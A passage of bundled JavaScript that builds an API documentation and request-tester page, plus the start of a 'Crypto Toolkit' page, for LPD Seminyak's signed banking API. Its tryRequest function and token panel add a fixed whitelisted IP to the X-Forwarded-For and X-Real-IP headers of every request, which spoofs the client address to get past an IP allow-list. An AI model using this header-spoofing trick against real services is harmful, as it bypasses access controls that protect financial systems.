    var code = (d && (d.responseCode || d.error)) ? String(d.responseCode || d.error).substring(0,12) : 'Gagal';
    el.style.background  = 'rgba(127,29,29,.2)';
    el.style.color       = '#fca5a5';
    el.style.borderColor = '#7f1d1d';
    if (dot) dot.style.color = '#ef4444';
    if (txt) txt.textContent = type.toUpperCase() + ' \u2715 ' + code;
    el.title = d ? JSON.stringify(d.raw || {error: d.error}) : '';
  }
}

function setHeaderInput(epId, key, value) {
  if (!value) return;
  var inp = document.querySelector('#ep-' + epId + ' .try-header-input[data-key="' + key + '"]');
  if (inp) inp.value = value;
}

function injectSnapHeaders(headers, token) {
  ['snap-token','snap-inquiry','snap-payment'].forEach(function(id) {
    setHeaderInput(id, 'X-TIMESTAMP',  headers['X-TIMESTAMP']);
    setHeaderInput(id, 'X-CLIENT-KEY', headers['X-CLIENT-KEY']);
    setHeaderInput(id, 'X-SIGNATURE',  headers['X-SIGNATURE']);
    if (token) setHeaderInput(id, 'Authorization', 'Bearer ' + token);
  });
}

function injectIosHeaders(headers, token) {
  // Inject into all non-SNAP, non-callback cards
  document.querySelectorAll('.ep-card').forEach(function(card) {
    var id = card.id.replace('ep-','');
    if (id && !id.startsWith('snap') && id !== 'ppob-cb') {
      setHeaderInput(id, 'X-TIMESTAMP', headers['X-TIMESTAMP']);
      setHeaderInput(id, 'X-CLIENT-ID', headers['X-CLIENT-ID']);
      setHeaderInput(id, 'X-SIGNATURE', headers['X-SIGNATURE']);
      if (token) setHeaderInput(id, 'Authorization', 'Bearer ' + token);
    }
  });
}

// \u2500\u2500\u2500 Token Detail Panel \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
function showTokenDetail(type, d) {
  var panel = document.getElementById('token-detail-panel');
  if (!panel) {
    panel = document.createElement('div');
    panel.id = 'token-detail-panel';
    panel.style.cssText = [
      'position:fixed;bottom:0;right:0;width:500px;max-height:90vh;overflow-y:auto',
      'background:#0f172a;color:#e2e8f0;border-radius:12px 0 0 0;z-index:9999',
      'box-shadow:-4px -4px 40px rgba(0,0,0,.7);font-size:12px;font-family:monospace',
      'border-top:2px solid #334155;border-left:2px solid #334155;transition:all .2s'
    ].join(';');
    document.body.appendChild(panel);
  }

  var ok      = !!(d.token);
  var hasResp = !!(d.responseCode || d.httpStatus);
  var isSnap  = type === 'snap';
  var accent  = ok ? '#22c55e' : (hasResp ? '#f59e0b' : '#ef4444');
  var icon    = ok ? 'fa-check-circle' : (hasResp ? 'fa-exclamation-triangle' : 'fa-times-circle');
  var ms      = d._ms ? '<span style="color:#475569;font-weight:400;font-size:11px">' + d._ms + ' ms</span>' : '';

  // \u2500\u2500 Header rows (always shown if we got headers from signing) \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
  var hdr = d.headers || {};
  // Store header values in a temp object accessible by copyHdr() below
  window._tokenHdrCache = hdr;
  var headerBlock = '';
  if (Object.keys(hdr).length > 0) {
    var hdrIdx = 0;
    var hdrRows = Object.keys(hdr).map(function(k) {
      var v = hdr[k];
      var shortened = v && v.length > 60 ? v.substring(0,60) + '...' : v;
      var color = k === 'X-SIGNATURE' ? '#86efac' : k === 'X-TIMESTAMP' ? '#c4b5fd' : '#fbbf24';
      var safeKey = k;
      return '<tr>'
        + '<td style="color:#64748b;padding:3px 10px 3px 0;white-space:nowrap;vertical-align:top;font-size:11px">' + safeKey + '</td>'
        + '<td style="padding:3px 0"><code style="color:' + color + ';word-break:break-all;font-size:11px">' + shortened + '</code>'
        + ' <button onclick="copyHdr(&quot;' + safeKey + '&quot;)" style="background:#1e293b;border:none;color:#64748b;cursor:pointer;padding:1px 5px;border-radius:3px;font-size:10px" title="Copy">&#128203;</button>'
        + '</td></tr>';
    }).join('');
    headerBlock = '<div style="margin-bottom:8px">'
      + '<div style="color:#94a3b8;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.8px;margin-bottom:4px;padding-bottom:4px;border-bottom:1px solid #1e293b">Generated Request Headers</div>'
      + '<table style="width:100%;border-collapse:collapse;line-height:1.6">'
        + hdrRows
        + '<tr><td style="color:#64748b;font-size:11px;padding:2px 10px 2px 0">X-Forwarded-For</td><td><code style="color:#f59e0b">34.50.74.78</code> <button id="copy-xfwd" onclick="copyHdr(&quot;X-Forwarded-For&quot;)" style="background:#1e293b;border:none;color:#64748b;cursor:pointer;padding:1px 5px;border-radius:3px;font-size:10px">&#128203;</button></td></tr>'
      + '</table>'
      + '</div>';
  }

  // \u2500\u2500 Response rows \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
  var respRows = '';
  if (d.url)            respRows += '<tr><td style="color:#64748b;font-size:11px;white-space:nowrap;padding:2px 10px 2px 0">URL</td><td><code style="color:#7dd3fc;word-break:break-all;font-size:10px">' + d.url + '</code></td></tr>';
  if (d.httpStatus)     respRows += '<tr><td style="color:#64748b;font-size:11px;white-space:nowrap;padding:2px 10px 2px 0">HTTP Status</td><td><code style="color:' + (d.httpStatus===200?'#4ade80':'#fbbf24') + '">' + d.httpStatus + '</code></td></tr>';
  if (d.responseCode)   respRows += '<tr><td style="color:#64748b;font-size:11px;white-space:nowrap;padding:2px 10px 2px 0">responseCode</td><td><code style="color:' + (d.responseCode==='2007300'?'#4ade80':'#fbbf24') + '">' + d.responseCode + '</code></td></tr>';
  if (d.responseMessage)respRows += '<tr><td style="color:#64748b;font-size:11px;white-space:nowrap;padding:2px 10px 2px 0">responseMessage</td><td><code style="color:#94a3b8">' + d.responseMessage + '</code></td></tr>';
  if (d.token)          respRows += '<tr><td style="color:#64748b;font-size:11px;white-space:nowrap;padding:2px 10px 2px 0">accessToken</td><td><code style="color:#4ade80;word-break:break-all;font-size:10px">' + d.token + '</code></td></tr>';
  if (d.error)          respRows += '<tr><td style="color:#64748b;font-size:11px;white-space:nowrap;padding:2px 10px 2px 0;vertical-align:top">error</td><td><code style="color:#f87171;word-break:break-all;font-size:10px">' + d.error + '</code></td></tr>';
  if (d.hint)           respRows += '<tr><td style="color:#64748b;font-size:11px;white-space:nowrap;padding:2px 10px 2px 0;vertical-align:top">hint</td><td><code style="color:#fbbf24;font-size:10px">' + d.hint + '</code></td></tr>';

  // \u2500\u2500 Status notes \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
  var noteHtml = '';
  if (ok) {
    noteHtml = '<div style="padding:10px 0 4px;color:#60a5fa;font-size:11px;line-height:1.7;border-top:1px solid #1e293b;margin-top:8px">'
      + '<i class="fas fa-magic" style="color:#a78bfa"></i> X-TIMESTAMP, X-' + (isSnap?'CLIENT-KEY':'CLIENT-ID') + ', X-SIGNATURE & Authorization <b>diisi otomatis</b>.<br>'
      + '<i class="fas fa-shield-alt" style="color:#f59e0b"></i> X-Forwarded-For: 34.50.74.78 diinjeksi otomatis ke setiap request.<br>'
      + '<i class="fas fa-clock" style="color:#94a3b8"></i> Token berlaku 3 menit dari: ' + (d.timestamp||'') + '.'
      + '</div>';
  } else if (isSnap && d.responseCode === '4017301') {
    noteHtml = '<div style="padding:10px 0 4px;color:#fbbf24;font-size:11px;line-height:1.7;border-top:1px solid #1e293b;margin-top:8px">'
      + '<i class="fas fa-info-circle"></i> <b>responseCode 4017301</b> = "Invalid access Token"<br>'
      + 'Artinya signature sampai ke server tetapi verifikasi gagal. Server memverifikasi menggunakan <b>public_key_bpd.pem</b>.<br>'
      + '<span style="color:#94a3b8">Diperlukan private key BPD (dari bank BPD Bali) untuk mendapatkan token SNAP yang valid.</span><br><br>'
      + '<i class="fas fa-check" style="color:#22c55e"></i> Headers (X-TIMESTAMP + X-SIGNATURE) <b>sudah diisi otomatis</b> di form endpoint.'
      + '</div>';
  } else if (!isSnap && d.httpStatus === 500) {
    noteHtml = '<div style="padding:10px 0 4px;color:#fbbf24;font-size:11px;line-height:1.7;border-top:1px solid #1e293b;margin-top:8px">'
      + '<i class="fas fa-database"></i> <b>HTTP 500</b> = Server error internal (koneksi SQL Server production bermasalah).<br>'
      + '<i class="fas fa-key" style="color:#22c55e"></i> <b style="color:#22c55e">Public key sudah terdaftar</b> di server via <code style="color:#94a3b8">/api/smart/access/key</code>.<br>'
      + '<span style="color:#94a3b8">Signature iOS sudah benar menggunakan <b>private_key_lpd.pem</b>. Masalah ada di sisi DB server production.</span><br><br>'
      + '<i class="fas fa-check" style="color:#22c55e"></i> Headers (X-TIMESTAMP + X-SIGNATURE) <b>sudah diisi otomatis</b> di form endpoint.'
      + '</div>';
  } else {
    noteHtml = '<div style="padding:10px 0 4px;color:#f87171;font-size:11px;line-height:1.7;border-top:1px solid #1e293b;margin-top:8px">'
      + '<i class="fas fa-exclamation-circle"></i> Koneksi ke server gagal. Periksa Base URL dan pastikan server berjalan.'
      + '</div>';
  }

  // \u2500\u2500 Assemble panel \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
  panel.innerHTML =
    '<div style="display:flex;align-items:center;gap:8px;padding:12px 16px;border-bottom:2px solid #1e293b;background:#020617;position:sticky;top:0;z-index:1">'
      + '<i class="fas ' + icon + '" style="color:' + accent + ';font-size:15px"></i>'
      + '<b style="color:' + accent + ';font-size:13px">' + type.toUpperCase() + ' Token \u2014 '
        + (ok ? '&#10003; Berhasil' : (hasResp ? '&#9888; Respons Server' : '&#10007; Gagal')) + '</b>'
      + ms
      + '<button onclick="closeTokenPanel()" style="margin-left:auto;background:transparent;border:none;color:#64748b;cursor:pointer;font-size:18px;line-height:1;padding:0 4px">&times;</button>'
    + '</div>'
    + '<div style="padding:14px 16px">'
      + headerBlock
      + (respRows ? '<div style="margin-top:8px"><div style="color:#94a3b8;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.8px;margin-bottom:4px;padding-bottom:4px;border-bottom:1px solid #1e293b">Server Response</div><table style="width:100%;border-collapse:collapse;line-height:1.7">' + respRows + '</table></div>' : '')
      + noteHtml
    + '</div>';

  panel.style.display = 'block';
  clearTimeout(panel._timer);
  // Keep open longer if error (user needs to read)
  panel._timer = setTimeout(function(){ panel.style.display='none'; }, ok ? 10000 : 20000);
}

// Keep showTokenToast as alias for compatibility
function showTokenToast(type, d) { showTokenDetail(type, d); }

function closeTokenPanel() {
  var p = document.getElementById('token-detail-panel');
  if (p) p.style.display = 'none';
}



// \u2500\u2500\u2500 Copy header value to clipboard \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
function copyHdr(key) {
  var cache = window._tokenHdrCache || {};
  var val = cache[key] || (key === 'X-Forwarded-For' ? WHITELIST_IP : '');
  if (!val) return;
  try {
    navigator.clipboard.writeText(val).then(function() {
      var btns = document.querySelectorAll('[onclick*="copyHdr(\\"' + key + '\\")"]');
      btns.forEach(function(b) {
        var o = b.innerHTML; b.innerHTML = '&#10003;';
        setTimeout(function(){ b.innerHTML = o; }, 1200);
      });
    });
  } catch(e) {
    var ta = document.createElement('textarea');
    ta.value = val; ta.style.cssText = 'position:fixed;opacity:0';
    document.body.appendChild(ta); ta.select();
    document.execCommand('copy'); document.body.removeChild(ta);
  }
}

// \u2500\u2500\u2500 Try Request (+ X-Forwarded-For otomatis) \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
function tryRequest(epId) {
  var btn = document.getElementById('try-btn-'+epId);
  var method = btn.getAttribute('data-method');
  var path = btn.getAttribute('data-path');
  var baseUrl = getBaseUrl();
  var url = baseUrl + path;

  var headers = { 'Content-Type': 'application/json', 'Accept': 'application/json' };

  // Inject X-Forwarded-For jika checkbox aktif (default: aktif)
  var chk = document.getElementById('chk-xforward');
  var xfwdOn = chk ? chk.checked : true;  // default on jika elemen tidak ada
  if (xfwdOn) {
    headers['X-Forwarded-For'] = WHITELIST_IP;
    headers['X-Real-IP']       = WHITELIST_IP;
  }

  // Collect header inputs
  document.querySelectorAll('#ep-'+epId+' .try-header-input').forEach(function(inp) {
    var k = inp.getAttribute('data-key');
    var v = inp.value.trim();
    if (k && v) headers[k] = v;
  });

  // Collect query params
  var queryParams = [];
  document.querySelectorAll('#ep-'+epId+' .try-query-input').forEach(function(inp) {
    var k = inp.getAttribute('data-key');
    var v = inp.value.trim();
    if (k && v) queryParams.push(encodeURIComponent(k)+'='+encodeURIComponent(v));
  });
  if (queryParams.length) url += '?' + queryParams.join('&');

  var bodyEl = document.getElementById('try-body-'+epId);
  var bodyStr = bodyEl ? bodyEl.value.trim() : '';

  btn.disabled = true;
  btn.innerHTML = '<span class="spinner"></span> Sending...';
  document.getElementById('resp-'+epId).style.display = 'none';

  var fetchOpts = { method: method, headers: headers };
  if (method === 'POST' && bodyStr) {
    try { JSON.parse(bodyStr); fetchOpts.body = bodyStr; } catch(e) {}
  }

  var reqInfo = method + ' ' + url;
  var t0 = Date.now();

  // Build sent-headers summary (exclude Content-Type for display)
  var sentHdrs = Object.keys(headers).filter(function(k){ return k !== 'Accept'; }).map(function(k){
    var v = headers[k];
    // Truncate long values
    return k + ': ' + (v && v.length > 40 ? v.substring(0,38) + '\u2026' : v);
  }).join(String.fromCharCode(10));

  fetch(url, fetchOpts)
    .then(function(r) {
      var ms = Date.now() - t0;
      return r.text().then(function(text){ return { status: r.status, text: text, ms: ms }; });
    })
    .then(function(d){ showResponse(epId, d.status, d.text, d.ms, reqInfo, sentHdrs); })
    .catch(function(err) {
      var NL = String.fromCharCode(10);
      showResponse(epId, 0, 'Network Error: ' + err.message + NL + NL + 'Pastikan:' + NL + '1. Base URL benar' + NL + '2. Server berjalan' + NL + '3. CORS diizinkan', Date.now()-t0, reqInfo, sentHdrs);
    })
    .finally(function() {
      btn.disabled = false;
      btn.innerHTML = '<i class="fas fa-paper-plane"></i> Send Request';
    });
}

function showResponse(epId, status, text, ms, reqInfo, sentHdrs) {
  var box = document.getElementById('resp-'+epId);
  var codeEl = document.getElementById('resp-status-'+epId);
  var timeEl = document.getElementById('resp-time-'+epId);
  var bodyEl = document.getElementById('resp-body-'+epId);
  var reqEl  = document.getElementById('resp-req-'+epId);
  var hdrsEl = document.getElementById('resp-hdrs-'+epId);

  box.style.display = 'block';
  timeEl.textContent = ms + ' ms';
  if (reqEl && reqInfo) reqEl.textContent = reqInfo;
  if (hdrsEl && sentHdrs) {
    hdrsEl.textContent = sentHdrs;
    hdrsEl.style.display = 'block';
  }

  var cls = status >= 200 && status < 300 ? 'status-2xx' : status >= 400 && status < 500 ? 'status-4xx' : 'status-5xx';
  if (status === 0) cls = 'status-5xx';
  codeEl.className = 'status-code ' + cls;
  codeEl.textContent = status || 'ERR';

  try {
    var parsed = JSON.parse(text);
    bodyEl.innerHTML = syntaxHighlight(JSON.stringify(parsed, null, 2));
  } catch(e) {
    bodyEl.textContent = text;
  }
}

function syntaxHighlight(json) {
  json = json.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
  return json.replace(/(\\s*)(\\"[^\\"]*\\")\\s*:\\s*/g, function(m,sp,key){
    return sp + '<span class="jk">'+key+'</span>: ';
  }).replace(/:\\s*(\\"[^\\"]*\\")/g, function(m,val){
    return ': <span class="js">'+val+'</span>';
  }).replace(/:\\s*(-?\\d+\\.?\\d*)/g, function(m,num){
    return ': <span class="jn">'+num+'</span>';
  }).replace(/:\\s*(true|false)/g, function(m,b){
    return ': <span class="jb">'+b+'</span>';
  }).replace(/:\\s*(null)/g, function(m,n){
    return ': <span class="jnull">'+n+'</span>';
  });
}

function copyExample(epId) {
  var el = document.getElementById('try-body-'+epId);
  var ex = el ? el.getAttribute('data-example') : '';
  if (el && ex) { el.value = ex; }
}

// Base URL change -> persist
document.getElementById('base-url-input').addEventListener('change', function() {
  localStorage.setItem('lpd_base_url', this.value);
});
(function(){
  var saved = localStorage.getItem('lpd_base_url');
  if (saved) document.getElementById('base-url-input').value = saved;
  // Restore token badges dari localStorage
  var st = localStorage.getItem('lpd_snap_token');
  var it = localStorage.getItem('lpd_ios_token');
  if (st) { _tokens.snap = st; updateTokenBadge('snap', st); }
  if (it) { _tokens.ios = it; updateTokenBadge('ios', it); }
})();
<\/script>
</body>
</html>`;
}
__name(ja, "ja");
function D(e, t, s, a, i, n, r, o, d) {
  const u = "mb-post", b = i.map((v) => `
    <tr>
      <td><span class="param-name">${v.name}</span></td>
      <td><span class="param-type">${v.type}</span></td>
      <td><span class="param-in">${v.in}</span></td>
      <td><span class="${v.req ? "param-req" : "param-opt"}">${v.req ? "required" : "optional"}</span></td>
      <td style="color:#374151;font-size:12px">${v.desc}</td>
    </tr>`).join(""), l = i.filter((v) => v.in === "header"), c = i.filter((v) => v.in === "query"), f = i.filter((v) => v.in === "body"), g = l.length ? `
    <div class="try-label">Headers</div>
    ${l.map((v) => `
    <div class="try-row">
      <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:3px">${v.name}${v.req ? ' <span style="color:red">*</span>' : ""}</label>
      <input class="try-input try-header-input" data-key="${v.name}" type="text"
        placeholder="${v.name === "Authorization" ? "Bearer eyJ0eXAi..." : v.name === "X-TIMESTAMP" ? "2024-01-15T10:30:00+07:00" : v.type}"/>
    </div>`).join("")}` : "", h = c.length ? `
    <div class="try-label" style="margin-top:8px">Query Parameters</div>
    ${c.map((v) => `
    <div class="try-row">
      <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:3px">${v.name}${v.req ? ' <span style="color:red">*</span>' : ""}</label>
      <input class="try-input try-query-input" data-key="${v.name}" type="text" placeholder="${v.type}"/>
    </div>`).join("")}` : "", k = f.length ? `
    <div class="try-label" style="margin-top:8px">Request Body (JSON)</div>
    ${r ? `<button onclick="copyExample('${e}')" style="font-size:11px;background:#f1f5f9;border:1px solid #e2e8f0;padding:3px 8px;border-radius:4px;cursor:pointer;margin-bottom:6px;color:#475569"><i class="fas fa-copy" style="margin-right:4px"></i>Isi Contoh</button>` : ""}
    <textarea id="try-body-${e}" class="try-input try-textarea" data-example="${r.replace(/"/g, "&quot;")}"
      placeholder='${JSON.stringify(Object.fromEntries(f.map((v) => [v.name, v.type])), null, 2)}'>${r}</textarea>` : "", y = o.map((v) => `<span class="mw-badge"><i class="fas fa-shield-alt"></i>${v}</span>`).join(""), p = d ? `<div class="info-box ib-blue" style="margin-top:12px"><i class="fas fa-info-circle"></i><span>${d}</span></div>` : "", w = n ? `
    <div class="try-label">Contoh Response 200 OK</div>
    <div class="schema-obj">${za(n)}</div>` : "";
  return `
<div class="ep-card" id="ep-${e}">
  <div class="ep-header" onclick="epToggle('${e}')">
    <span class="method-badge ${u}">${t}</span>
    <span class="ep-path">${s}</span>
    <span class="ep-summary">${a}</span>
    <i class="fas fa-chevron-down ep-chevron"></i>
  </div>
  <div class="ep-body">
    <div class="ep-tabs">
      <div class="ep-tab active" id="tab-${e}-params" onclick="showTab('${e}','params')">Parameters</div>
      <div class="ep-tab" id="tab-${e}-response" onclick="showTab('${e}','response')">Response</div>
      <div class="ep-tab" id="tab-${e}-try" onclick="showTab('${e}','try')">Try it out</div>
    </div>

    <!-- PARAMS TAB -->
    <div class="ep-pane active" id="pane-${e}-params">
      ${y ? `<div style="margin-bottom:10px">${y}</div>` : ""}
      ${p}
      <table class="param-table">
        <thead><tr><th>Name</th><th>Type</th><th>In</th><th>Required</th><th>Description</th></tr></thead>
        <tbody>${b}</tbody>
      </table>
    </div>

    <!-- RESPONSE TAB -->
    <div class="ep-pane" id="pane-${e}-response">
      ${w}
      <div class="try-label" style="margin-top:16px">Response Codes</div>
      <table class="param-table" style="margin-top:6px">
        <thead><tr><th>Status / Code</th><th>Arti</th></tr></thead>
        <tbody>
          <tr><td><span style="color:#16a34a;font-weight:700">200 / 00</span></td><td>Sukses</td></tr>
          <tr><td><span style="color:#d97706;font-weight:700">81</span></td><td>Inquiry sukses, lanjut ke posting</td></tr>
          <tr><td><span style="color:#dc2626;font-weight:700">01</span></td><td>Data tidak ditemukan / rekening tidak aktif</td></tr>
          <tr><td><span style="color:#dc2626;font-weight:700">40</span></td><td>Saldo tidak mencukupi</td></tr>
          <tr><td><span style="color:#dc2626;font-weight:700">45</span></td><td>Transaksi duplikat</td></tr>
          <tr><td><span style="color:#dc2626;font-weight:700">51-53</span></td><td>Hash mismatch (data dimodifikasi)</td></tr>
          <tr><td><span style="color:#dc2626;font-weight:700">54</span></td><td>PIN salah</td></tr>
          <tr><td><span style="color:#dc2626;font-weight:700">62</span></td><td>Transaksi tidak dapat diproses</td></tr>
          <tr><td><span style="color:#dc2626;font-weight:700">68</span></td><td>Timeout / exception</td></tr>
        </tbody>
      </table>
    </div>

    <!-- TRY IT OUT TAB -->
    <div class="ep-pane" id="pane-${e}-try">
      <div class="try-panel">
        ${g}
        ${h}
        ${k}
        <div style="display:flex;align-items:center;margin-top:14px;flex-wrap:wrap;gap:8px">
          <button class="try-btn" id="try-btn-${e}" data-method="${t}" data-path="${s}" onclick="tryRequest('${e}')">
            <i class="fas fa-paper-plane"></i> Send Request
          </button>
          <button class="try-clear" onclick="document.getElementById('resp-${e}').style.display='none'">Clear</button>
          <span style="font-size:11px;color:var(--muted);margin-left:auto">
            <i class="fas fa-info-circle"></i> Request dikirim ke Base URL di atas
          </span>
        </div>
        <div id="resp-${e}" class="response-box" style="display:none">
          <div class="response-status">
            <span class="status-code" id="resp-status-${e}">200</span>
            <span style="color:#94a3b8;font-size:12px">Response</span>
            <span class="response-time" id="resp-time-${e}"></span>
            <span id="resp-req-${e}" style="color:#475569;font-size:10px;margin-left:8px;font-family:monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:220px"></span>
          </div>
          <pre id="resp-hdrs-${e}" style="display:none;background:#0a0f1e;color:#475569;font-size:10px;padding:8px 14px;margin:0;border-bottom:1px solid #1e293b;white-space:pre;font-family:monospace;line-height:1.5"></pre>
          <pre class="response-body" id="resp-body-${e}"></pre>
        </div>
      </div>
    </div>

  </div>
</div>`;
}
__name(D, "D");
function za(e) {
  try {
    return JSON.stringify(JSON.parse(e), null, 2).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/("[\w-]+")\s*:/g, '<span class="hl-key">$1</span>:').replace(/:\s*(".*?")/g, ': <span class="hl-str">$1</span>').replace(/:\s*(-?\d+\.?\d*)/g, ': <span class="hl-num">$1</span>').replace(/:\s*(true|false)/g, ': <span class="hl-bool">$1</span>');
  } catch {
    return e;
  }
}
__name(za, "za");
function Ka() {
  return `<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>LPD Seminyak \u2014 Crypto Toolkit</title>
<script src="https://cdn.tailwindcss.com"><\/script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css"/>
<style>
:root{--primary:#7c3aed;--primary-dark:#5b21b6;--secondary:#0f172a;--sidebar-w:260px}
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',system-ui,sans-serif;background:#0f172a;color:#e2e8f0;min-height:100vh}
#sidebar{position:fixed;top:0;left:0;width:var(--sidebar-w);height:100vh;background:#1e1b4b;overflow-y:auto;z-index:100;border-right:1px solid #312e81}
#sidebar .logo{padding:18px 16px 14px;background:linear-gradient(135deg,#4c1d95,#7c3aed);border-bottom:1px solid #4c1d95}
#sidebar .logo h1{font-size:15px;font-weight:800;color:#fff;letter-spacing:.5px}
#sidebar .logo p{font-size:10px;color:#c4b5fd;margin-top:3px}
#sidebar nav a{display:flex;align-items:center;gap:9px;padding:9px 14px;font-size:12px;color:#a5b4fc;text-decoration:none;transition:all .15s;cursor:pointer;border-left:3px solid transparent}
#sidebar nav a:hover,#sidebar nav a.active{color:#fff;background:rgba(139,92,246,.2);border-left-color:#7c3aed}
#sidebar nav a i{width:16px;text-align:center;font-size:13px}
#sidebar .nav-section{padding:10px 14px 3px;font-size:9px;font-weight:800;text-transform:uppercase;letter-spacing:1.5px;color:#4c1d95}
#main{margin-left:var(--sidebar-w);min-height:100vh;padding:0 0 40px}
.topbar{background:#1e1b4b;border-bottom:1px solid #312e81;padding:12px 28px;display:flex;align-items:center;justify-content:space-between}
.topbar h2{font-size:16px;font-weight:700;color:#c4b5fd}
.section{display:none}.section.active{display:block}
.content{padding:24px 28px}
.panel{background:#1e293b;border:1px solid #334155;border-radius:12px;margin-bottom:20px;overflow:hidden}
.panel-header{padding:14px 18px;background:#0f172a;border-bottom:1px solid #1e293b;display:flex;align-items:center;gap:10px}
.panel-header h3{font-size:13px;font-weight:700;color:#a78bfa}
.panel-header .badge{font-size:10px;padding:2px 8px;border-radius:999px;background:#312e81;color:#c4b5fd;font-weight:600}
.panel-body{padding:18px}
label{display:block;font-size:11px;font-weight:600;color:#94a3b8;margin-bottom:5px;text-transform:uppercase;letter-spacing:.5px}
input[type=text],input[type=number],textarea,select{
  width:100%;background:#0f172a;border:1px solid #334155;border-radius:7px;
  padding:9px 12px;color:#e2e8f0;font-size:13px;font-family:'Courier New',monospace;
  outline:none;transition:border .15s;
}
input[type=text]:focus,input[type=number]:focus,textarea:focus,select:focus{border-color:#7c3aed}
textarea{resize:vertical;min-height:80px;line-height:1.5}
select{cursor:pointer}
.btn{display:inline-flex;align-items:center;gap:7px;padding:9px 18px;border-radius:8px;font-size:12px;font-weight:700;cursor:pointer;border:none;transition:all .15s;text-transform:uppercase;letter-spacing:.5px}
.btn-primary{background:linear-gradient(135deg,#7c3aed,#6d28d9);color:#fff}
.btn-primary:hover{background:linear-gradient(135deg,#6d28d9,#5b21b6);transform:translateY(-1px)}
.btn-secondary{background:#334155;color:#94a3b8}
.btn-secondary:hover{background:#475569;color:#e2e8f0}
.btn-green{background:linear-gradient(135deg,#059669,#047857);color:#fff}
.btn-green:hover{background:linear-gradient(135deg,#047857,#065f46)}
.btn-orange{background:linear-gradient(135deg,#d97706,#b45309);color:#fff}
.btn-orange:hover{background:linear-gradient(135deg,#b45309,#92400e)}
.btn-red{background:linear-gradient(135deg,#dc2626,#b91c1c);color:#fff}
.btn-red:hover{background:linear-gradient(135deg,#b91c1c,#991b1b)}
.btn:disabled{opacity:.5;cursor:not-allowed;transform:none!important}
.result-box{margin-top:14px;display:none}
.result-box.show{display:block}
.result-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:8px}
.result-header span{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.5px}
.result-ok{color:#34d399}.result-err{color:#f87171}
pre.result{background:#020617;border:1px solid #1e293b;border-radius:8px;padding:14px;font-size:11.5px;font-family:'Courier New',monospace;color:#a5f3fc;overflow-x:auto;white-space:pre-wrap;word-break:break-all;max-height:400px;overflow-y:auto;line-height:1.6}
.copy-btn{background:#1e293b;border:1px solid #334155;color:#94a3b8;border-radius:5px;padding:3px 9px;font-size:10px;cursor:pointer;transition:all .15s}
.copy-btn:hover{background:#334155;color:#e2e8f0}
.grid-2{display:grid;grid-template-columns:1fr 1fr;gap:14px}
.grid-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px}
@media(max-width:900px){.grid-2,.grid-3{grid-template-columns:1fr}}
.field-row{margin-bottom:12px}
.info-box{padding:10px 14px;border-radius:8px;font-size:12px;margin:10px 0;display:flex;gap:9px;align-items:flex-start;line-height:1.6}
.info-box i{margin-top:1px;flex-shrink:0}
.info-purple{background:#1e1b4b;border-left:3px solid #7c3aed;color:#a5b4fc}
.info-green{background:#022c22;border-left:3px solid #059669;color:#6ee7b7}
.info-red{background:#2d0000;border-left:3px solid #dc2626;color:#fca5a5}
.info-yellow{background:#1c1200;border-left:3px solid #d97706;color:#fcd34d}
.spinner{width:14px;height:14px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .6s linear infinite;display:inline-block}
@keyframes spin{to{transform:rotate(360deg)}}
